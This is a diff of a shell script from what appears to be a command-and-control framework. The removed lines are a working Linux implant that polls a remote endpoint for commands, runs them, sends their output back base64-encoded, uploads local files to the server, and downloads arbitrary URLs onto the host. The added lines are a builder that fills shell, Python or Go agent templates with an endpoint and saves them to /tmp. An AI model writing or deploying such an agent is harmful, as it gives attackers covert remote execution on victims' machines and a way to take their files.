@@ -1,49 +1,50 @@
-#Hello
-curl -sk "$2/default.php?m=res&res=$(echo -n "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
-while true
-do
-#grab 'n' run, skip if empty
-cmds=$(curl -sk "$2/default.php?m=cmds&id=$1&o=L")
-act=$(echo $cmds | grep $1 | cut -f 2 -d ":")
 
-if [[ $act == "run" ]];
-then
-run=$(echo $cmds | grep $1 | cut -f 3- -d ":")
+if [ $1 == "shell" ]; then
+echo "Building $1 agent"
+cp agents-templates/template.sh agents-templates/$2
+sed -i "s/ENDPOINT/$3/gi" agents-templates/$2
+sed -i "s/MODE/$4/gi" agents-templates/$2
+sed -i "s/RESPONSE/$5/gi" agents-templates/$2
+cp agents-templates/$2 /tmp/$2
+rm agents-templates/$2
+echo "Agent saved at /tmp/$2"
+echo """
+----Config----
+Endpoint:$3
+Mode Param: $4
+Response Param: $5
+"""
 
-if [ -z "$run" ];
-then 
-sleep 10
-continue
+elif [ $1 == "python" ]; then
+cp agents-templates/template.py agents-templates/$2
+sed -i "s/ENDPOINT/$3/gi" agents-templates/$2
+sed -i "s/MODE/$4/gi" agents-templates/$2
+sed -i "s/RESPONSE/$5/gi" agents-templates/$2
+cp agents-templates/$2 /tmp/$2
+rm agents-templates/$2
+echo "Agent saved at /tmp/$2"
+echo """
+----Config----
+Endpoint:$3
+Mode Param: $4
+Response Param: $5
+"""
+
+elif [ $1 == "go" ]; then
+cp agents-templates/template.go agents-templates/$2
+sed -i "s/ENDPOINT/$3/gi" agents-templates/$2
+sed -i "s/MODE/$4/gi" agents-templates/$2
+sed -i "s/RESPONSE/$5/gi" agents-templates/$2
+cp agents-templates/$2 /tmp/$2
+rm agents-templates/$2
+echo "Agent saved at /tmp/$2"
+echo """
+----Config----
+Endpoint:$3
+Mode Param: $4
+Response Param: $5
+"""
+
+else
+echo "No Agent of this type"
 fi
-
-res=$($run 2>&1| base64 | tr -d '\n')
-#send result
-curl -sk "$2/default.php?m=res&res=$(echo $res)&id=$1" > /dev/null
-sleep 10
-
-elif [[ $act == "download" ]];
-then
-file=$(echo $cmds | grep $1 | cut -f 3- -d ":")
-
-curl -sk "$2/default.php?m=res&res=$(echo -n "Uploading $file" | base64)&id=$1" >/dev/null
-
-curl -sk -F data=@$(echo -n $file) "$2/default.php?m=up&id=$1" >/dev/null
-
-sleep 10
-
-
-elif [[ $act == "upload" ]];
-then
-url=$(echo $cmds | grep $1 | cut -f 3,4 -d ":")
-echo $url
-path=$(echo $cmds | grep $1 | cut -f 5- -d ":")
-echo $path
-
-
-curl -sk "$2/default.php?m=res&res=$(echo -n "Downloading $url" | base64)&id=$1" > /dev/null
-curl -sk  "$url" > $path
-sleep 10
-fi
-
-sleep 10
-done
